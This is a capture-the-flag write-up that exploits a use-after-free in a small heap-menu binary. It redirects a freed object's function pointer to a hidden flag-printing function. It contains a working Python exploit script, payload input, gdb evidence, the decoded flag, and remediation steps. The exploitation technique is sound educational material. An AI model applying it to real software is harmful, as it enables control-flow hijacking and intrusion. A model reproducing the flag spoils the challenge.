# Matrix Reloaded (Freed Memory) — Use-After-Free → ret2win

**Category:** IoT / Pwn (Heap — Use-After-Free)
**Points:** 30
**Binary:** `CTF_File/matrix` (ELF 64-bit LSB PIE, x86-64, not stripped)
**Flag:** `KPMG_CTF{Matrix_Escaped}`

---

## 1. Challenge description

> Hidden functionality exists beyond the available menu options, and tools like `strings`,
> `nm`, or `gdb` can help you find it. The bug lies in how the program handles a user after
> deletion. Follow the sequence **create → delete → create data → access user** and observe how
> heap memory is reused. After locating the target function in the debugger, try supplying its
> hexadecimal address when creating data and see what happens when the stale user object is
> accessed.

The description spells out a classic **use-after-free (UAF)** in a small heap menu program.

---

## 2. Initial reconnaissance

### 2.1 File identification

```
$ file CTF_File/matrix
matrix: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
        interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

The binary is **not stripped**, so every function has a name — a huge shortcut.

### 2.2 Mitigations

| Mitigation        | Status | Evidence |
|-------------------|--------|----------|
| PIE / ASLR        | **Enabled** | `Type: DYN`, `FLAGS_1: PIE` |
| NX (DEP)          | Enabled | `GNU_STACK … RW` (no `E`) |
| Stack canary      | Disabled | no `__stack_chk_fail` import |
| RELRO             | Partial | `GNU_RELRO` present, no `BIND_NOW` |

PIE means addresses are relocated; disabled ASLR (or a debugger) is used to get a deterministic
address, exactly as the hint suggests.

### 2.3 Symbols (`nm`)

```
$ nm matrix | grep -E 'create_user|create_data|delete_user|show_user|print_username|reveal_flag|g_user|g_data'
00000000000013a1 T create_data
000000000000129d T create_user
0000000000001360 T delete_user
0000000000004080 B g_user
0000000000004088 B g_data
00000000000011e9 T print_username
0000000000001213 T reveal_flag        <-- hidden "win" function
00000000000014aa T show_user
```

`reveal_flag` (offset `0x1213`) is the hidden functionality: it is never referenced by any menu
path, and it reconstructs the flag internally.

### 2.4 Strings (`strings`)

```
Username: %s
Flag: %s
Enter username:
User created.
No user exists.
User deleted.
Enter data:
Enter handler address (hex):
%lx
Invalid address.
Data created.
=== The Matrix Reloaded ( Freed Memory ) ===
1. Create user
2. Delete user
3. Show user
4. Create data
5. Exit
```

The string **`Enter handler address (hex):`** followed by the **`%lx`** format is the smoking gun:
`create_data` lets the user write an arbitrary 64-bit value into the reused chunk — and that
offset is the object's **function pointer**.

---

## 3. Reconstructing the logic

The program stores two globals: `g_user` and `g_data`. The user object is `0x28` (40) bytes with a
function pointer at offset `+0x20`.

```c
struct user {
    char         name[0x20];      // 0x00
    void       (*handler)(char*); // 0x20   <-- function pointer
};                                 // sizeof == 0x28
```

Reconstructed C (from the disassembly):

```c
struct user { char name[0x20]; void (*handler)(char*); };
struct user *g_user = NULL;
struct user *g_data = NULL;

void print_username(char *u) { printf("Username: %s\n", u); }

void create_user(void) {
    g_user = malloc(0x28);
    if (!g_user) { perror("malloc"); exit(1); }
    g_user->handler = print_username;          // store fn ptr at +0x20
    printf("Enter username: ");
    fgets(g_user->name, 0x20, stdin);
    g_user->name[strcspn(g_user->name, "\n")] = 0;
    puts("User created.");
}

void delete_user(void) {
    if (!g_user) { puts("No user exists."); return; }
    free(g_user);                              // <-- BUG: g_user NOT set to NULL
    puts("User deleted.");
}

void create_data(void) {
    g_data = malloc(0x28);                     // same size -> same chunk reused
    if (!g_data) { perror("malloc"); exit(1); }
    printf("Enter data: ");
    fgets(g_data->name, 0x20, stdin);
    g_data->name[strcspn(g_data->name, "\n")] = 0;
    printf("Enter handler address (hex): ");
    unsigned long addr;
    if (scanf("%lx", &addr) != 1) { puts("Invalid address."); return; }
    getchar();
    g_data->handler = (void*)addr;             // arbitrary write at +0x20
    puts("Data created.");
}

void show_user(void) {
    if (!g_user) { puts("No user exists."); return; }
    g_user->handler(g_user);                   // call *(g_user+0x20)
}
```

### The bug

`delete_user()` calls `free(g_user)` but **never clears `g_user`**, leaving a dangling pointer.
`create_data()` performs a `malloc(0x28)` — the exact same request size — so glibc hands back the
just-freed chunk. Now `g_data == g_user`, and `create_data()` writes an attacker-controlled
address into `g_data->handler` at offset `+0x20`, which is the very function pointer that
`show_user()` later calls.

Key disassembly:

```asm
; delete_user
1381: mov rax, [g_user]
1388: mov rdi, rax
138b: call free            ; freed, g_user left dangling

; create_data
13aa: mov edi, 0x28
13af: call malloc          ; reuses the freed 0x28 chunk -> g_data == g_user
...
1408: call fgets           ; fill name[0x20]
...
1466: call scanf("%lx")    ; read attacker address
1486: mov rdx, [rbp-0x18]
148a: mov rax, [g_data]
1491: mov [rax+0x20], rdx  ; *(+0x20) = arbitrary value

; show_user
14cb: mov rax, [g_user]
14d2: mov rdx, [rax+0x20]  ; function pointer
14dd: mov rdi, rax
14e0: call rdx             ; controlled indirect call
```

---

## 4. The hidden target — `reveal_flag`

```asm
0000000000001213 <reveal_flag>:
   121b: movabs rax, 0x1c0e19051d170a11
   1225: movabs rdx, 0x052233282e3b1721
   122f: mov    [rbp-0x20], rax
   1233: mov    [rbp-0x18], rdx
   1237: movabs rax, 0x273e3f2a3b39291f
   1241: mov    [rbp-0x10], rax
   1245: mov    QWORD PTR [rbp-0x8], 0x0        ; i = 0
   124f: ...
   125a: movzx  eax, BYTE PTR [rax]
   125d: xor    eax, 0x5a                       ; XOR key 0x5a
   126d: mov    BYTE PTR [rax], cl
   126f: add    QWORD PTR [rbp-0x8], 0x1
   1274: cmp    QWORD PTR [rbp-0x8], 0x17       ; while i <= 23
   1279: jbe    124f
   127f: lea    rax, [rbp-0x40]
   1283: lea    rdx, [rip+...]                  ; "Flag: %s\n"
   1295: call   printf
```

It XORs **24 embedded bytes** with `0x5a` and prints the result. Extracting them:

```python
words = [0x1c0e19051d170a11, 0x052233282e3b1721, 0x273e3f2a3b39291f]
buf = b"".join(w.to_bytes(8, "little") for w in words)
print(bytes(b ^ 0x5a for b in buf).decode())
# -> KPMG_CTF{Matrix_Escaped}
```

At runtime the function prints exactly this value (see §6), which cross-validates the static
decoding.

---

## 5. Exploit strategy

Heap reuse (tcache) makes the freed user object and the new data object the **same chunk**:

```
create user     -> malloc(0x28) = chunk C ; g_user = C ; C+0x20 = print_username
delete user     -> free(C)                 ; g_user = C (dangling!)
create data     -> malloc(0x28) = chunk C  ; g_data = C == g_user
                   writes attacker hex at C+0x20   (C+0x20 = *(g_user+0x20))
show user       -> calls *(g_user+0x20) with rdi = g_user
```

So the final step is a controlled indirect call. Supplying

```
reveal_flag = PIE_base + 0x1213
```

makes `show_user()` call `reveal_flag(g_user)` and print the flag.

With ASLR disabled, the PIE base is deterministic:

```
base = 0x555555554000
reveal_flag = 0x555555554000 + 0x1213 = 0x555555555213
```

Confirmed in gdb:

```
$ gdb -q ./matrix -batch -ex 'break main' -ex run -ex 'info address reveal_flag'
$1 = 0x555555555213
```

---

## 6. Proof of Concept

### 6.1 Menu interaction sequence

```
1              # Create user
neo            # username
2              # Delete user          -> free(), dangling g_user
4              # Create data          -> malloc() reuses chunk, g_data == g_user
AAAA           # data body
555555555213   # handler address (hex) -> writes reveal_flag at *(+0x20)
3              # Show user            -> call *(g_user+0x20) = reveal_flag
5              # Exit
```

### 6.2 Automated exploit — `exploit/solve.py`

```python
#!/usr/bin/env python3
import subprocess, sys, os

BINARY          = os.path.join(os.path.dirname(__file__), "..", "CTF_File", "matrix")
OFF_REVEAL_FLAG = 0x1213
PIE_BASE_NOASLR = 0x555555554000

def build_payload(reveal_addr):
    return b"".join([
        b"1\n", b"neo\n",                                  # create user
        b"2\n",                                            # delete user (UAF)
        b"4\n", b"AAAA\n",                                 # create data (reuse chunk)
        ("%x\n" % reveal_addr).encode(),                   # hijack *(g_user+0x20)
        b"3\n",                                            # show user -> call
        b"5\n",                                            # exit
    ])

def main():
    reveal = int(sys.argv[1], 16) if len(sys.argv) > 1 \
             else PIE_BASE_NOASLR + OFF_REVEAL_FLAG
    print("[*] reveal_flag @ 0x%x" % reveal)
    cmd = ["setarch", os.uname().machine, "-R", BINARY]   # -R disables ASLR
    out = subprocess.run(cmd, input=build_payload(reveal),
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT
                        ).stdout.decode(errors="replace")
    print(out)
    for line in out.splitlines():
        if "Flag:" in line:
            print("[+] FLAG:", line.split("Flag:", 1)[1].strip())

if __name__ == "__main__":
    main()
```

### 6.3 Run output

```
[*] reveal_flag @ 0x555555555213
=== The Matrix Reloaded ( Freed Memory ) ===
...
> Enter data: Enter handler address (hex): Data created.
...
> Flag: KPMG_CTF{Matrix_Escaped}
[+] FLAG: KPMG_CTF{Matrix_Escaped}
```

### 6.4 Debugger proof of the UAF

At the `show_user` breakpoint (see `exploit/uaf_demo.gdb`):

```
=== At show_user entry (stale object reused) ===
&g_user (global ptr)   = 0x555555558080
g_user (dangling)      = 0x55555555b030
g_data (reused chunk)  = 0x55555555b030
g_user == g_data ?     = 1
*(g_user+0x20) handler = 0x555555555213
address of reveal_flag = 0x555555555213
chunk bytes [0..0x28)  =
0x55555555b030: 41 41 41 41 00 00 00 00   "AAAA"
...
0x55555555b050: 13 52 55 55 55 55 00 00   -> 0x0000555555555213  (chunk+0x20)
```

This proves: the freed chunk was handed back by `malloc`, `g_user == g_data`, and the function
pointer at `+0x20` was overwritten with the address of `reveal_flag`.

---

## 7. Flag

```
KPMG_CTF{Matrix_Escaped}
```

---

## 8. Root cause & remediation

**Root cause:** classic **use-after-free** — `delete_user()` frees the object but leaves the global
pointer dangling, and `create_data()` reallocates the same-size chunk and lets input overwrite a
function pointer that is later invoked.

**Fix (any one of these):**

1. **NULL the pointer after free** (primary fix):
   ```c
   free(g_user);
   g_user = NULL;
   ```
2. Don't expose a raw function pointer in a data structure that can be reallocated from untrusted
   input; validate it against an allowlist before calling.
3. Use a safe abstraction (e.g. a tagged/union type or `int` opcode dispatch instead of raw
   pointers) so freed memory can never be interpreted as a callable address.
4. Enable hardening: full RELRO, stack canary, and consider `-D_FORTIFY_SOURCE=3`.

---

## 9. Files in this directory

| Path | Description |
|------|-------------|
| `CTF_File.zip` | Original challenge archive |
| `CTF_File/matrix` | Extracted vulnerable binary |
| `exploit/solve.py` | Automated UAF → ret2win exploit |
| `exploit/find_target.gdb` | gdb helper to locate `reveal_flag` and menu functions |
| `exploit/uaf_demo.gdb` | gdb script proving `g_user == g_data` and pointer hijack |
| `artifacts/flag.txt` | Captured flag |
| `artifacts/exploit_output.txt` | Full exploit transcript |
| `artifacts/gdb_uaf_demo.txt` | Full gdb UAF evidence transcript |
| `artifacts/uaf_input.txt` | Raw stdin payload used by the gdb demo |
| `WRITEUP.md` | This report |

### Quick reproduction

```bash
cd /home/boss/Works/ctf/KPMG/iot
python3 exploit/solve.py            # ASLR off (deterministic address)
# or, with the address from a debugger:
python3 exploit/solve.py 555555555213
```
